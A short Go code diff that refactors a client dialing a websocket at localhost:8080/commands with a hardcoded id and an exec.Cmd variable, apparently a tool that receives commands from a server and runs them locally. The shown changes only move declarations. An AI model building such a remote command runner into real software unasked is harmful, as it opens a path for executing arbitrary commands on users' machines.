@@ -10,6 +10,7 @@ import (
 const (
 	serverAddr = "http://localhost:8080/commands?id="
 	url        = "ws://localhost:8080/commands?id="
+	id         = "cum"
 )
 
 var (
@@ -19,16 +20,14 @@ var (
 
 func main() {
 
-	id := "cum"
-	generatedURL := url + id
-	generatedOrigin := serverAddr + id
+	var cmd *exec.Cmd
+	generatedURL, generatedOrigin := url+id, serverAddr+id
 
 	conn, err := websocket.Dial(generatedURL, "", generatedOrigin)
 	if err != nil {
 		log.Fatal(err)
 
 	}
-	var cmd *exec.Cmd
 
 	go func() {
 		for {
